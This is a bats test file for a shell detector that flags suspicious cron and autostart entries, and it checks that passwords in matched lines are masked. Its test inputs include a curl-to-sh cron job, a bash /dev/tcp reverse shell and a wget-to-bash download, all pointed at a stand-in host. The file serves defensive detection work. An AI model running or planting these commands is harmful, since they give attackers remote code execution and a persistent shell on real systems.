#!/usr/bin/env bats
# persist_suspicious: cron lines and autostart scripts

load helper

setup() { load_script; }

@test "download-and-run and reverse shells are suspicious" {
  run persist_suspicious '*/5 * * * * root curl -fsSL http://192.0.2.1/x | sh'
  [ "$status" -eq 0 ]
  run persist_suspicious 'bash -i >& /dev/tcp/192.0.2.1/4444 0>&1'
  [ "$status" -eq 0 ]
  run persist_suspicious "python3 -c 'import socket,os'"
  [ "$status" -eq 0 ]
}

@test "ordinary maintenance lines are not" {
  run persist_suspicious '0 3 * * * root /usr/bin/fail2ban-client set sshd unbanip 192.0.2.1 >/dev/null 2>&1'
  [ "$status" -eq 1 ]
  run persist_suspicious '*/5 * * * * www php -c /etc/php.ini /var/www/cron.php >/dev/null 2>&1'
  [ "$status" -eq 1 ]
  run persist_suspicious '15 2 * * * root sqlite3 /var/lib/fail2ban/fail2ban.sqlite3 vacuum'
  [ "$status" -eq 1 ]
}

@test "passwords in matched lines are masked" {
  run persist_suspicious '0 1 * * * root wget -qO- https://user:secret@192.0.2.1/x.sh | bash'
  [ "$status" -eq 0 ]
  [[ $output != *secret* ]]
}
